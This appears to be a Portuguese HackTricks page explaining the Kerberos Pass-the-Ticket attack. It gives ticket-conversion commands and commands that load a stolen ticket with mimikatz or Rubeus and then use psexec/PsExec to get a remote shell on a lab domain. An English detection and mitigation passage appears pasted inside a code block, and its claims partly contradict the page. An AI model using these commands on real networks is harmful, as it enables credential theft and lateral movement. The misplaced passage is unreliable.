# Passar o Ticket (PTT)

Esse tipo de ataque é semelhante ao Pass the Key, mas em vez de usar hashes para solicitar um ticket, o próprio ticket é roubado e usado para autenticar como seu proprietário.

**Leia**:

* [Colhendo tickets do Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
* [Colhendo tickets do Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Troca de tickets Linux e Windows entre plataformas**

O script [ticket\_converter](https://github.com/Zer1t0/ticket\_converter). Os únicos parâmetros necessários são o ticket atual e o arquivo de saída, ele detecta automaticamente o formato do arquivo de entrada do ticket e o converte. Por exemplo:
```
root@kali:ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi
root@kali:ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
### Ataque Pass The Ticket

[Kekeo](https://github.com/gentilkiwi/kekeo) é uma ferramenta que pode ser usada para gerar TGTs (Ticket Granting Tickets) a partir de TGSs (Ticket Granting Service) previamente roubados. Essa ferramenta pode ser usada em sistemas Windows e também pode ser usada para converter TGSs em TGTs no Windows. Essa ferramenta não foi verificada devido à necessidade de uma licença em sua biblioteca ASN1, mas acredito que vale a pena mencioná-la.

{% code title="Linux" %}
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Windows" %}

# Pass the Ticket

Pass the ticket is a technique used to authenticate to a system using Kerberos tickets stolen from another system. This technique is commonly used in lateral movement attacks within a network.

## How it works

When a user authenticates to a Windows domain, a Kerberos ticket is generated and stored in memory. This ticket can be used to authenticate to other systems within the same domain without the need for the user to enter their credentials again. 

An attacker can use a tool like Mimikatz to steal these tickets from memory and use them to authenticate to other systems within the domain. This allows the attacker to move laterally within the network without being detected.

## Detection

Detection of pass the ticket attacks can be difficult as they do not involve the use of stolen credentials. Instead, the attacker is using a valid Kerberos ticket to authenticate to other systems within the domain. 

One way to detect pass the ticket attacks is to monitor for unusual activity within the domain, such as a user authenticating to multiple systems within a short period of time. Another way is to monitor for the use of known tools like Mimikatz.

## Mitigation

To mitigate pass the ticket attacks, it is important to limit the use of Kerberos tickets within the domain. This can be done by implementing strong password policies and enforcing regular password changes. Additionally, it is important to monitor for unusual activity within the domain and to restrict the use of tools like Mimikatz.

{% endcode %}
```bash
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
{% endcode %}

## Referências

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas ferramentas da comunidade **mais avançadas do mundo**.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
